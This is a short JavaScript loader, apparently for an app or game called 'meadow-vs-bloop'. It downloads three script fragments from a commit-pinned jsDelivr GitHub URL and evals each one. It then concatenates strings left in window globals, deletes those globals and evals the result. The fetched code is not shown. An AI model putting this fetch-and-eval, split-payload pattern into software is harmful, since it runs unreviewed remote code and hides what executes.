/*WORLD1_BANK star_bloom*/
(async function(){
  var SHA="c97ad9af2dd0db917b28eae3feeef30f3ac0aab0";
  var base="https://cdn.jsdelivr.net/gh/senrealinvestment/meadow-vs-bloop@"+SHA+"/";
  var names=["app.p0.js","app.p1.js","app.p2.js"];
  for (var i=0;i<names.length;i++){
    var t=await (await fetch(base+names[i])).text();
    (0,eval)(t);
  }
  var s=(window.__MVB0||"")+(window.__MVB1||"")+(window.__MVB2||"");
  try{delete window.__MVB0;delete window.__MVB1;delete window.__MVB2;}catch(e){}
  (0,eval)(s);
})();
